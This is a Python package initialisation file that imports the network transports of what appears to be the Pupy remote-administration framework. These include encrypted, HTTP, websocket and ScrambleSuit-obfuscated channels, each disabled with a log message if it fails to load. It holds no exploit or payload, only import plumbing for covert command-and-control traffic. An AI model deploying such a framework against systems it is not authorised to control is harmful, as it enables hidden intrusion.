import logging

from .streams import *
from .base import chain_transports
from .servers import PupyTCPServer, PupyUDPServer
from .clients import PupyTCPClient, PupySSLClient
from .clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
from .clients import PupyAsyncClient, PupyUDPClient

from .transports.dummy import DummyPupyTransport
from .transports.dummy_packets import DummyPupyPacketsTransport

try:
    from .transports.rsa_aes import RSA_AESClient, RSA_AESServer
except Exception, e:
    logging.exception('Transport rsa_aes disabled: {}'.format(e))
    RSA_AESClient = None
    RSA_AESServer = None

try:
    from .transports.http import PupyHTTPClient, PupyHTTPServer
except Exception, e:
    logging.exception('Transport http disabled: {}'.format(e))
    PupyHTTPClient = None
    PupyHTTPServer = None

try:
    from .transports.websocket import PupyWebSocketClient, PupyWebSocketServer
except Exception, e:
    logging.exception('Transport websocket disabled: {}'.format(e))
    PupyWebSocketClient = None
    PupyWebSocketServer = None

try:
    from .transports.ec4 import EC4TransportServer, EC4TransportClient
except Exception as e:
    logging.exception('Transport ec4 disabled: {}'.format(e))
    EC4TransportServer = None
    EC4TransportClient = None

try:
    from .transports.ecm import ECMTransportServer, ECMTransportClient
except Exception as e:
    logging.exception('Transport ecm disabled: {}'.format(e))
    ECMTransportServer = None
    ECMTransportClient = None

try:
    from .transports.scramblesuit.scramblesuit import ScrambleSuitClient, ScrambleSuitServer
except Exception as e:
    logging.exception('Transport scramblesuit disabled: {}'.format(e))
    ScrambleSuitClient = None
    ScrambleSuitServer = None
